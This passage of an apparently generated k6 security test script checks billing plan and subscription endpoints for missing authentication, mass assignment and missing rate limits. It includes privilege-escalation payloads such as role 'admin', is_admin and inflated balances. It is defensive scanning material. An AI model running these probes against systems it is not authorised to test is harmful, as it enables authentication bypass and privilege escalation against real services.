            const response = makeEmptyTokenRequest(httpMethod, BASE_URL + testPath, null, {
                headers: { [AUTH_HEADER]: 'Bearer ' },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/subscriptions/{id}', 'patch',
                    'Endpoint accessible with empty Bearer token',
                    { status: response.status });
            }
        }
        // Test /v1/billing/subscriptions/{id}/activate without auth
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/activate');
            const response = unauthRequest('post', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/subscriptions/{id}/activate', 'post',
                    'Endpoint accessible without authentication',
                    { status: response.status });
            } else {
                logPass('api2', '/v1/billing/subscriptions/{id}/activate', 'post');
            }
        }

        // Test /v1/billing/subscriptions/{id}/activate with empty token
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/activate');
            const httpMethod = 'post' === 'delete' ? 'del' : 'post';
            http.cookieJar().clear(BASE_URL + testPath);
            const makeEmptyTokenRequest = (m, url, body, params) => {
                if (m === 'get' || m === 'head') return http[m](url, params);
                return http[m](url, body, params);
            };
            const response = makeEmptyTokenRequest(httpMethod, BASE_URL + testPath, null, {
                headers: { [AUTH_HEADER]: 'Bearer ' },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/subscriptions/{id}/activate', 'post',
                    'Endpoint accessible with empty Bearer token',
                    { status: response.status });
            }
        }
        // Test /v1/billing/subscriptions/{id}/cancel without auth
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/cancel');
            const response = unauthRequest('post', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/subscriptions/{id}/cancel', 'post',
                    'Endpoint accessible without authentication',
                    { status: response.status });
            } else {
                logPass('api2', '/v1/billing/subscriptions/{id}/cancel', 'post');
            }
        }

        // Test /v1/billing/subscriptions/{id}/cancel with empty token
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/cancel');
            const httpMethod = 'post' === 'delete' ? 'del' : 'post';
            http.cookieJar().clear(BASE_URL + testPath);
            const makeEmptyTokenRequest = (m, url, body, params) => {
                if (m === 'get' || m === 'head') return http[m](url, params);
                return http[m](url, body, params);
            };
            const response = makeEmptyTokenRequest(httpMethod, BASE_URL + testPath, null, {
                headers: { [AUTH_HEADER]: 'Bearer ' },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/subscriptions/{id}/cancel', 'post',
                    'Endpoint accessible with empty Bearer token',
                    { status: response.status });
            }
        }
        // Test /v1/billing/subscriptions/{id}/capture without auth
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/capture');
            const response = unauthRequest('post', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/subscriptions/{id}/capture', 'post',
                    'Endpoint accessible without authentication',
                    { status: response.status });
            } else {
                logPass('api2', '/v1/billing/subscriptions/{id}/capture', 'post');
            }
        }

        // Test /v1/billing/subscriptions/{id}/capture with empty token
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/capture');
            const httpMethod = 'post' === 'delete' ? 'del' : 'post';
            http.cookieJar().clear(BASE_URL + testPath);
            const makeEmptyTokenRequest = (m, url, body, params) => {
                if (m === 'get' || m === 'head') return http[m](url, params);
                return http[m](url, body, params);
            };
            const response = makeEmptyTokenRequest(httpMethod, BASE_URL + testPath, null, {
                headers: { [AUTH_HEADER]: 'Bearer ' },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/subscriptions/{id}/capture', 'post',
                    'Endpoint accessible with empty Bearer token',
                    { status: response.status });
            }
        }
        // Test /v1/billing/subscriptions/{id}/revise without auth
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/revise');
            const response = unauthRequest('post', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/subscriptions/{id}/revise', 'post',
                    'Endpoint accessible without authentication',
                    { status: response.status });
            } else {
                logPass('api2', '/v1/billing/subscriptions/{id}/revise', 'post');
            }
        }

        // Test /v1/billing/subscriptions/{id}/revise with empty token
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/revise');
            const httpMethod = 'post' === 'delete' ? 'del' : 'post';
            http.cookieJar().clear(BASE_URL + testPath);
            const makeEmptyTokenRequest = (m, url, body, params) => {
                if (m === 'get' || m === 'head') return http[m](url, params);
                return http[m](url, body, params);
            };
            const response = makeEmptyTokenRequest(httpMethod, BASE_URL + testPath, null, {
                headers: { [AUTH_HEADER]: 'Bearer ' },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/subscriptions/{id}/revise', 'post',
                    'Endpoint accessible with empty Bearer token',
                    { status: response.status });
            }
        }
        // Test /v1/billing/subscriptions/{id}/suspend without auth
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/suspend');
            const response = unauthRequest('post', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/subscriptions/{id}/suspend', 'post',
                    'Endpoint accessible without authentication',
                    { status: response.status });
            } else {
                logPass('api2', '/v1/billing/subscriptions/{id}/suspend', 'post');
            }
        }

        // Test /v1/billing/subscriptions/{id}/suspend with empty token
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/suspend');
            const httpMethod = 'post' === 'delete' ? 'del' : 'post';
            http.cookieJar().clear(BASE_URL + testPath);
            const makeEmptyTokenRequest = (m, url, body, params) => {
                if (m === 'get' || m === 'head') return http[m](url, params);
                return http[m](url, body, params);
            };
            const response = makeEmptyTokenRequest(httpMethod, BASE_URL + testPath, null, {
                headers: { [AUTH_HEADER]: 'Bearer ' },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/subscriptions/{id}/suspend', 'post',
                    'Endpoint accessible with empty Bearer token',
                    { status: response.status });
            }
        }
        // Test /v1/billing/subscriptions/{id}/transactions without auth
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/transactions');
            const response = unauthRequest('get', BASE_URL + testPath, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/subscriptions/{id}/transactions', 'get',
                    'Endpoint accessible without authentication',
                    { status: response.status });
            } else {
                logPass('api2', '/v1/billing/subscriptions/{id}/transactions', 'get');
            }
        }

        // Test /v1/billing/subscriptions/{id}/transactions with empty token
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/transactions');
            const httpMethod = 'get' === 'delete' ? 'del' : 'get';
            http.cookieJar().clear(BASE_URL + testPath);
            const makeEmptyTokenRequest = (m, url, body, params) => {
                if (m === 'get' || m === 'head') return http[m](url, params);
                return http[m](url, body, params);
            };
            const response = makeEmptyTokenRequest(httpMethod, BASE_URL + testPath, null, {
                headers: { [AUTH_HEADER]: 'Bearer ' },
                timeout: TIMEOUT,
                jar: null,
            });
            testsRun.add(1);

            if (response.status >= 200 && response.status < 300) {
                logFinding('api2', '/v1/billing/subscriptions/{id}/transactions', 'get',
                    'Endpoint accessible with empty Bearer token',
                    { status: response.status });
            }
        }
    });
}

// API3: Broken Object Property Level Authorization (Mass Assignment)
function testMassAssignment() {
    group('API3 - Mass Assignment', function() {
        console.log('[API3] Testing Mass Assignment...');

        const massAssignmentPayloads = [
            { role: 'admin' },
            { is_admin: true },
            { isAdmin: true },
            { permissions: ['admin', 'write', 'delete'] },
            { verified: true },
            { email_verified: true },
            { balance: 999999 },
        ];

        // Test /v1/billing/plans
        {
            const testPath = replacePathParams('/v1/billing/plans');
            massAssignmentPayloads.forEach(payload => {
                const response = authRequest('post', BASE_URL + testPath, payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check if unauthorized field appears in response
                    const responseBody = response.body.toLowerCase();
                    const payloadKey = Object.keys(payload)[0].toLowerCase();

                    if (responseBody.includes(payloadKey)) {
                        logFinding('api3', '/v1/billing/plans', 'post',
                            `Mass assignment accepted: ${payloadKey}`,
                            { status: response.status, payload });
                    } else {
                        logPass('api3', '/v1/billing/plans', 'post');
                    }
                }
            });
        }
        // Test /v1/billing/plans/{id}
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}');
            massAssignmentPayloads.forEach(payload => {
                const response = authRequest('patch', BASE_URL + testPath, payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check if unauthorized field appears in response
                    const responseBody = response.body.toLowerCase();
                    const payloadKey = Object.keys(payload)[0].toLowerCase();

                    if (responseBody.includes(payloadKey)) {
                        logFinding('api3', '/v1/billing/plans/{id}', 'patch',
                            `Mass assignment accepted: ${payloadKey}`,
                            { status: response.status, payload });
                    } else {
                        logPass('api3', '/v1/billing/plans/{id}', 'patch');
                    }
                }
            });
        }
        // Test /v1/billing/plans/{id}/activate
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}/activate');
            massAssignmentPayloads.forEach(payload => {
                const response = authRequest('post', BASE_URL + testPath, payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check if unauthorized field appears in response
                    const responseBody = response.body.toLowerCase();
                    const payloadKey = Object.keys(payload)[0].toLowerCase();

                    if (responseBody.includes(payloadKey)) {
                        logFinding('api3', '/v1/billing/plans/{id}/activate', 'post',
                            `Mass assignment accepted: ${payloadKey}`,
                            { status: response.status, payload });
                    } else {
                        logPass('api3', '/v1/billing/plans/{id}/activate', 'post');
                    }
                }
            });
        }
        // Test /v1/billing/plans/{id}/deactivate
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}/deactivate');
            massAssignmentPayloads.forEach(payload => {
                const response = authRequest('post', BASE_URL + testPath, payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check if unauthorized field appears in response
                    const responseBody = response.body.toLowerCase();
                    const payloadKey = Object.keys(payload)[0].toLowerCase();

                    if (responseBody.includes(payloadKey)) {
                        logFinding('api3', '/v1/billing/plans/{id}/deactivate', 'post',
                            `Mass assignment accepted: ${payloadKey}`,
                            { status: response.status, payload });
                    } else {
                        logPass('api3', '/v1/billing/plans/{id}/deactivate', 'post');
                    }
                }
            });
        }
        // Test /v1/billing/plans/{id}/update-pricing-schemes
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}/update-pricing-schemes');
            massAssignmentPayloads.forEach(payload => {
                const response = authRequest('post', BASE_URL + testPath, payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check if unauthorized field appears in response
                    const responseBody = response.body.toLowerCase();
                    const payloadKey = Object.keys(payload)[0].toLowerCase();

                    if (responseBody.includes(payloadKey)) {
                        logFinding('api3', '/v1/billing/plans/{id}/update-pricing-schemes', 'post',
                            `Mass assignment accepted: ${payloadKey}`,
                            { status: response.status, payload });
                    } else {
                        logPass('api3', '/v1/billing/plans/{id}/update-pricing-schemes', 'post');
                    }
                }
            });
        }
        // Test /v1/billing/subscriptions
        {
            const testPath = replacePathParams('/v1/billing/subscriptions');
            massAssignmentPayloads.forEach(payload => {
                const response = authRequest('post', BASE_URL + testPath, payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check if unauthorized field appears in response
                    const responseBody = response.body.toLowerCase();
                    const payloadKey = Object.keys(payload)[0].toLowerCase();

                    if (responseBody.includes(payloadKey)) {
                        logFinding('api3', '/v1/billing/subscriptions', 'post',
                            `Mass assignment accepted: ${payloadKey}`,
                            { status: response.status, payload });
                    } else {
                        logPass('api3', '/v1/billing/subscriptions', 'post');
                    }
                }
            });
        }
        // Test /v1/billing/subscriptions/{id}
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}');
            massAssignmentPayloads.forEach(payload => {
                const response = authRequest('patch', BASE_URL + testPath, payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check if unauthorized field appears in response
                    const responseBody = response.body.toLowerCase();
                    const payloadKey = Object.keys(payload)[0].toLowerCase();

                    if (responseBody.includes(payloadKey)) {
                        logFinding('api3', '/v1/billing/subscriptions/{id}', 'patch',
                            `Mass assignment accepted: ${payloadKey}`,
                            { status: response.status, payload });
                    } else {
                        logPass('api3', '/v1/billing/subscriptions/{id}', 'patch');
                    }
                }
            });
        }
        // Test /v1/billing/subscriptions/{id}/activate
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/activate');
            massAssignmentPayloads.forEach(payload => {
                const response = authRequest('post', BASE_URL + testPath, payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check if unauthorized field appears in response
                    const responseBody = response.body.toLowerCase();
                    const payloadKey = Object.keys(payload)[0].toLowerCase();

                    if (responseBody.includes(payloadKey)) {
                        logFinding('api3', '/v1/billing/subscriptions/{id}/activate', 'post',
                            `Mass assignment accepted: ${payloadKey}`,
                            { status: response.status, payload });
                    } else {
                        logPass('api3', '/v1/billing/subscriptions/{id}/activate', 'post');
                    }
                }
            });
        }
        // Test /v1/billing/subscriptions/{id}/cancel
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/cancel');
            massAssignmentPayloads.forEach(payload => {
                const response = authRequest('post', BASE_URL + testPath, payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check if unauthorized field appears in response
                    const responseBody = response.body.toLowerCase();
                    const payloadKey = Object.keys(payload)[0].toLowerCase();

                    if (responseBody.includes(payloadKey)) {
                        logFinding('api3', '/v1/billing/subscriptions/{id}/cancel', 'post',
                            `Mass assignment accepted: ${payloadKey}`,
                            { status: response.status, payload });
                    } else {
                        logPass('api3', '/v1/billing/subscriptions/{id}/cancel', 'post');
                    }
                }
            });
        }
        // Test /v1/billing/subscriptions/{id}/capture
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/capture');
            massAssignmentPayloads.forEach(payload => {
                const response = authRequest('post', BASE_URL + testPath, payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check if unauthorized field appears in response
                    const responseBody = response.body.toLowerCase();
                    const payloadKey = Object.keys(payload)[0].toLowerCase();

                    if (responseBody.includes(payloadKey)) {
                        logFinding('api3', '/v1/billing/subscriptions/{id}/capture', 'post',
                            `Mass assignment accepted: ${payloadKey}`,
                            { status: response.status, payload });
                    } else {
                        logPass('api3', '/v1/billing/subscriptions/{id}/capture', 'post');
                    }
                }
            });
        }
        // Test /v1/billing/subscriptions/{id}/revise
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/revise');
            massAssignmentPayloads.forEach(payload => {
                const response = authRequest('post', BASE_URL + testPath, payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check if unauthorized field appears in response
                    const responseBody = response.body.toLowerCase();
                    const payloadKey = Object.keys(payload)[0].toLowerCase();

                    if (responseBody.includes(payloadKey)) {
                        logFinding('api3', '/v1/billing/subscriptions/{id}/revise', 'post',
                            `Mass assignment accepted: ${payloadKey}`,
                            { status: response.status, payload });
                    } else {
                        logPass('api3', '/v1/billing/subscriptions/{id}/revise', 'post');
                    }
                }
            });
        }
        // Test /v1/billing/subscriptions/{id}/suspend
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/suspend');
            massAssignmentPayloads.forEach(payload => {
                const response = authRequest('post', BASE_URL + testPath, payload);
                testsRun.add(1);
                responseTime.add(response.timings.duration);

                if (response.status >= 200 && response.status < 300) {
                    // Check if unauthorized field appears in response
                    const responseBody = response.body.toLowerCase();
                    const payloadKey = Object.keys(payload)[0].toLowerCase();

                    if (responseBody.includes(payloadKey)) {
                        logFinding('api3', '/v1/billing/subscriptions/{id}/suspend', 'post',
                            `Mass assignment accepted: ${payloadKey}`,
                            { status: response.status, payload });
                    } else {
                        logPass('api3', '/v1/billing/subscriptions/{id}/suspend', 'post');
                    }
                }
            });
        }
    });
}

// API4: Unrestricted Resource Consumption
function testResourceConsumption() {
    group('API4 - Resource Consumption', function() {
        console.log('[API4] Testing Resource Consumption...');

        // Test /v1/billing/plans with excessive limit
        {
            const testPath = replacePathParams('/v1/billing/plans');
            const url = BASE_URL + testPath + '?limit=100000&per_page=100000';
            const response = authRequest('get', url, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            // Check for rate limit headers
            const hasRateLimit = response.headers['X-RateLimit-Limit'] ||
                                response.headers['x-ratelimit-limit'] ||
                                response.headers['RateLimit-Limit'];

            if (response.status === 429) {
                logPass('api4', '/v1/billing/plans', 'get');
            } else if (response.status >= 200 && response.status < 300 && !hasRateLimit) {
                logFinding('api4', '/v1/billing/plans', 'get',
                    'No rate limiting detected',
                    { status: response.status, hasRateLimitHeader: !!hasRateLimit });
            } else {
                logPass('api4', '/v1/billing/plans', 'get');
            }
        }
        // Test /v1/billing/plans with excessive limit
        {
            const testPath = replacePathParams('/v1/billing/plans');
            const url = BASE_URL + testPath + '?limit=100000&per_page=100000';
            const response = authRequest('post', url, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            // Check for rate limit headers
            const hasRateLimit = response.headers['X-RateLimit-Limit'] ||
                                response.headers['x-ratelimit-limit'] ||
                                response.headers['RateLimit-Limit'];

            if (response.status === 429) {
                logPass('api4', '/v1/billing/plans', 'post');
            } else if (response.status >= 200 && response.status < 300 && !hasRateLimit) {
                logFinding('api4', '/v1/billing/plans', 'post',
                    'No rate limiting detected',
                    { status: response.status, hasRateLimitHeader: !!hasRateLimit });
            } else {
                logPass('api4', '/v1/billing/plans', 'post');
            }
        }
        // Test /v1/billing/plans/{id} with excessive limit
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}');
            const url = BASE_URL + testPath + '?limit=100000&per_page=100000';
            const response = authRequest('get', url, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            // Check for rate limit headers
            const hasRateLimit = response.headers['X-RateLimit-Limit'] ||
                                response.headers['x-ratelimit-limit'] ||
                                response.headers['RateLimit-Limit'];

            if (response.status === 429) {
                logPass('api4', '/v1/billing/plans/{id}', 'get');
            } else if (response.status >= 200 && response.status < 300 && !hasRateLimit) {
                logFinding('api4', '/v1/billing/plans/{id}', 'get',
                    'No rate limiting detected',
                    { status: response.status, hasRateLimitHeader: !!hasRateLimit });
            } else {
                logPass('api4', '/v1/billing/plans/{id}', 'get');
            }
        }
        // Test /v1/billing/plans/{id} with excessive limit
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}');
            const url = BASE_URL + testPath + '?limit=100000&per_page=100000';
            const response = authRequest('patch', url, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            // Check for rate limit headers
            const hasRateLimit = response.headers['X-RateLimit-Limit'] ||
                                response.headers['x-ratelimit-limit'] ||
                                response.headers['RateLimit-Limit'];

            if (response.status === 429) {
                logPass('api4', '/v1/billing/plans/{id}', 'patch');
            } else if (response.status >= 200 && response.status < 300 && !hasRateLimit) {
                logFinding('api4', '/v1/billing/plans/{id}', 'patch',
                    'No rate limiting detected',
                    { status: response.status, hasRateLimitHeader: !!hasRateLimit });
            } else {
                logPass('api4', '/v1/billing/plans/{id}', 'patch');
            }
        }
        // Test /v1/billing/plans/{id}/activate with excessive limit
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}/activate');
            const url = BASE_URL + testPath + '?limit=100000&per_page=100000';
            const response = authRequest('post', url, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            // Check for rate limit headers
            const hasRateLimit = response.headers['X-RateLimit-Limit'] ||
                                response.headers['x-ratelimit-limit'] ||
                                response.headers['RateLimit-Limit'];

            if (response.status === 429) {
                logPass('api4', '/v1/billing/plans/{id}/activate', 'post');
            } else if (response.status >= 200 && response.status < 300 && !hasRateLimit) {
                logFinding('api4', '/v1/billing/plans/{id}/activate', 'post',
                    'No rate limiting detected',
                    { status: response.status, hasRateLimitHeader: !!hasRateLimit });
            } else {
                logPass('api4', '/v1/billing/plans/{id}/activate', 'post');
            }
        }
        // Test /v1/billing/plans/{id}/deactivate with excessive limit
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}/deactivate');
            const url = BASE_URL + testPath + '?limit=100000&per_page=100000';
            const response = authRequest('post', url, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            // Check for rate limit headers
            const hasRateLimit = response.headers['X-RateLimit-Limit'] ||
                                response.headers['x-ratelimit-limit'] ||
                                response.headers['RateLimit-Limit'];

            if (response.status === 429) {
                logPass('api4', '/v1/billing/plans/{id}/deactivate', 'post');
            } else if (response.status >= 200 && response.status < 300 && !hasRateLimit) {
                logFinding('api4', '/v1/billing/plans/{id}/deactivate', 'post',
                    'No rate limiting detected',
                    { status: response.status, hasRateLimitHeader: !!hasRateLimit });
            } else {
                logPass('api4', '/v1/billing/plans/{id}/deactivate', 'post');
            }
        }
        // Test /v1/billing/plans/{id}/update-pricing-schemes with excessive limit
        {
            const testPath = replacePathParams('/v1/billing/plans/{id}/update-pricing-schemes');
            const url = BASE_URL + testPath + '?limit=100000&per_page=100000';
            const response = authRequest('post', url, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            // Check for rate limit headers
            const hasRateLimit = response.headers['X-RateLimit-Limit'] ||
                                response.headers['x-ratelimit-limit'] ||
                                response.headers['RateLimit-Limit'];

            if (response.status === 429) {
                logPass('api4', '/v1/billing/plans/{id}/update-pricing-schemes', 'post');
            } else if (response.status >= 200 && response.status < 300 && !hasRateLimit) {
                logFinding('api4', '/v1/billing/plans/{id}/update-pricing-schemes', 'post',
                    'No rate limiting detected',
                    { status: response.status, hasRateLimitHeader: !!hasRateLimit });
            } else {
                logPass('api4', '/v1/billing/plans/{id}/update-pricing-schemes', 'post');
            }
        }
        // Test /v1/billing/subscriptions with excessive limit
        {
            const testPath = replacePathParams('/v1/billing/subscriptions');
            const url = BASE_URL + testPath + '?limit=100000&per_page=100000';
            const response = authRequest('post', url, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            // Check for rate limit headers
            const hasRateLimit = response.headers['X-RateLimit-Limit'] ||
                                response.headers['x-ratelimit-limit'] ||
                                response.headers['RateLimit-Limit'];

            if (response.status === 429) {
                logPass('api4', '/v1/billing/subscriptions', 'post');
            } else if (response.status >= 200 && response.status < 300 && !hasRateLimit) {
                logFinding('api4', '/v1/billing/subscriptions', 'post',
                    'No rate limiting detected',
                    { status: response.status, hasRateLimitHeader: !!hasRateLimit });
            } else {
                logPass('api4', '/v1/billing/subscriptions', 'post');
            }
        }
        // Test /v1/billing/subscriptions/{id} with excessive limit
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}');
            const url = BASE_URL + testPath + '?limit=100000&per_page=100000';
            const response = authRequest('get', url, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            // Check for rate limit headers
            const hasRateLimit = response.headers['X-RateLimit-Limit'] ||
                                response.headers['x-ratelimit-limit'] ||
                                response.headers['RateLimit-Limit'];

            if (response.status === 429) {
                logPass('api4', '/v1/billing/subscriptions/{id}', 'get');
            } else if (response.status >= 200 && response.status < 300 && !hasRateLimit) {
                logFinding('api4', '/v1/billing/subscriptions/{id}', 'get',
                    'No rate limiting detected',
                    { status: response.status, hasRateLimitHeader: !!hasRateLimit });
            } else {
                logPass('api4', '/v1/billing/subscriptions/{id}', 'get');
            }
        }
        // Test /v1/billing/subscriptions/{id} with excessive limit
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}');
            const url = BASE_URL + testPath + '?limit=100000&per_page=100000';
            const response = authRequest('patch', url, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            // Check for rate limit headers
            const hasRateLimit = response.headers['X-RateLimit-Limit'] ||
                                response.headers['x-ratelimit-limit'] ||
                                response.headers['RateLimit-Limit'];

            if (response.status === 429) {
                logPass('api4', '/v1/billing/subscriptions/{id}', 'patch');
            } else if (response.status >= 200 && response.status < 300 && !hasRateLimit) {
                logFinding('api4', '/v1/billing/subscriptions/{id}', 'patch',
                    'No rate limiting detected',
                    { status: response.status, hasRateLimitHeader: !!hasRateLimit });
            } else {
                logPass('api4', '/v1/billing/subscriptions/{id}', 'patch');
            }
        }
        // Test /v1/billing/subscriptions/{id}/activate with excessive limit
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/activate');
            const url = BASE_URL + testPath + '?limit=100000&per_page=100000';
            const response = authRequest('post', url, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            // Check for rate limit headers
            const hasRateLimit = response.headers['X-RateLimit-Limit'] ||
                                response.headers['x-ratelimit-limit'] ||
                                response.headers['RateLimit-Limit'];

            if (response.status === 429) {
                logPass('api4', '/v1/billing/subscriptions/{id}/activate', 'post');
            } else if (response.status >= 200 && response.status < 300 && !hasRateLimit) {
                logFinding('api4', '/v1/billing/subscriptions/{id}/activate', 'post',
                    'No rate limiting detected',
                    { status: response.status, hasRateLimitHeader: !!hasRateLimit });
            } else {
                logPass('api4', '/v1/billing/subscriptions/{id}/activate', 'post');
            }
        }
        // Test /v1/billing/subscriptions/{id}/cancel with excessive limit
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/cancel');
            const url = BASE_URL + testPath + '?limit=100000&per_page=100000';
            const response = authRequest('post', url, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            // Check for rate limit headers
            const hasRateLimit = response.headers['X-RateLimit-Limit'] ||
                                response.headers['x-ratelimit-limit'] ||
                                response.headers['RateLimit-Limit'];

            if (response.status === 429) {
                logPass('api4', '/v1/billing/subscriptions/{id}/cancel', 'post');
            } else if (response.status >= 200 && response.status < 300 && !hasRateLimit) {
                logFinding('api4', '/v1/billing/subscriptions/{id}/cancel', 'post',
                    'No rate limiting detected',
                    { status: response.status, hasRateLimitHeader: !!hasRateLimit });
            } else {
                logPass('api4', '/v1/billing/subscriptions/{id}/cancel', 'post');
            }
        }
        // Test /v1/billing/subscriptions/{id}/capture with excessive limit
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/capture');
            const url = BASE_URL + testPath + '?limit=100000&per_page=100000';
            const response = authRequest('post', url, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            // Check for rate limit headers
            const hasRateLimit = response.headers['X-RateLimit-Limit'] ||
                                response.headers['x-ratelimit-limit'] ||
                                response.headers['RateLimit-Limit'];

            if (response.status === 429) {
                logPass('api4', '/v1/billing/subscriptions/{id}/capture', 'post');
            } else if (response.status >= 200 && response.status < 300 && !hasRateLimit) {
                logFinding('api4', '/v1/billing/subscriptions/{id}/capture', 'post',
                    'No rate limiting detected',
                    { status: response.status, hasRateLimitHeader: !!hasRateLimit });
            } else {
                logPass('api4', '/v1/billing/subscriptions/{id}/capture', 'post');
            }
        }
        // Test /v1/billing/subscriptions/{id}/revise with excessive limit
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/revise');
            const url = BASE_URL + testPath + '?limit=100000&per_page=100000';
            const response = authRequest('post', url, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            // Check for rate limit headers
            const hasRateLimit = response.headers['X-RateLimit-Limit'] ||
                                response.headers['x-ratelimit-limit'] ||
                                response.headers['RateLimit-Limit'];

            if (response.status === 429) {
                logPass('api4', '/v1/billing/subscriptions/{id}/revise', 'post');
            } else if (response.status >= 200 && response.status < 300 && !hasRateLimit) {
                logFinding('api4', '/v1/billing/subscriptions/{id}/revise', 'post',
                    'No rate limiting detected',
                    { status: response.status, hasRateLimitHeader: !!hasRateLimit });
            } else {
                logPass('api4', '/v1/billing/subscriptions/{id}/revise', 'post');
            }
        }
        // Test /v1/billing/subscriptions/{id}/suspend with excessive limit
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/suspend');
            const url = BASE_URL + testPath + '?limit=100000&per_page=100000';
            const response = authRequest('post', url, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            // Check for rate limit headers
            const hasRateLimit = response.headers['X-RateLimit-Limit'] ||
                                response.headers['x-ratelimit-limit'] ||
                                response.headers['RateLimit-Limit'];

            if (response.status === 429) {
                logPass('api4', '/v1/billing/subscriptions/{id}/suspend', 'post');
            } else if (response.status >= 200 && response.status < 300 && !hasRateLimit) {
                logFinding('api4', '/v1/billing/subscriptions/{id}/suspend', 'post',
                    'No rate limiting detected',
                    { status: response.status, hasRateLimitHeader: !!hasRateLimit });
            } else {
                logPass('api4', '/v1/billing/subscriptions/{id}/suspend', 'post');
            }
        }
        // Test /v1/billing/subscriptions/{id}/transactions with excessive limit
        {
            const testPath = replacePathParams('/v1/billing/subscriptions/{id}/transactions');
            const url = BASE_URL + testPath + '?limit=100000&per_page=100000';
            const response = authRequest('get', url, null);
            testsRun.add(1);
            responseTime.add(response.timings.duration);

            // Check for rate limit headers
